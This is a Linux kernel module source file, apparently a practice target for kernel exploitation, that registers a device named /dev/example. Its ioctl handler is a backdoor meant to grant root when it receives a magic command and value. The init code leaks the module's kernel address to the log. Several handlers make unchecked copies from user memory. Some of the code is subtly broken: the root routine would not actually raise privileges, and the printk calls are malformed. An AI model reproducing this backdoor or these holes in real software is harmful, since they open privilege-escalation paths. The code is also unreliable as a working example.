#include <linux/fs.h>
#include <linux/init.h>
#include <linux/file.h>
#include <linux/errno.h>
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/tty.h>
#include <linux/userfaultfd.h>
#include <linux/cred.h>

#define BECOME_ROOT_CHECK           0xDEADBEEFCAFEBABE
#define BECOME_ROOT           0x31137

MODULE_LICENSE("GPL");
MODULE_AUTHOR("A");

struct Request{
	unsigned long long value;
};

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Set the credentials to root */

    commit_creds(root);
}

static long example_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
    struct Request req;
    copy_from_user( &req , arg , sizeof(struct Request) );
	if(cmd == BECOME_ROOT && req.value == BECOME_ROOT_CHECK){
		set_root();
	}
	return 0;
}

static ssize_t example_read(struct file *filp, char __user *buf, size_t len, loff_t *f_pos){
	copy_to_user(buf, "Output Message\n",10); 
    pr_info("You read from the device");
    return 0x31337;
}

static ssize_t example_write(struct file *filp, const char __user *buf, size_t len, loff_t *f_pos){
	char buf2[100];
	copy_from_user(buf2, buf,100); 
	printk(6, "You sent in %s\n", buf2);
    return 0x1337;
}

static int example_open(struct inode *inodep, struct file *filp){
	printk(0, "Device Opened\n");
    return 0;
}

static int example_close(struct inode *inodep, struct file *filp){
	printk(1, "Device Closed\n");
    pr_info("Goodbye from kernel~\n");
    return 0;
}

static const struct file_operations example_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = example_ioctl,
    .open           = example_open,
    .release        = example_close,
    .read           = example_read,
    .write          = example_write,
};

static struct miscdevice example_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "example",
    .fops = &example_fops,
};

static int __init example_init(void)
{
    printk(KERN_INFO "/dev/example created.");
    pr_info("ko loaded at %lx" , (long long)example_ioctl &0xfffffffffffff000 );
    pr_info("Hello from kernel :D\n");
    return misc_register(&example_device);
}

static void __exit example_exit(void)
{
    misc_deregister(&example_device);
}

module_init(example_init);
module_exit(example_exit);
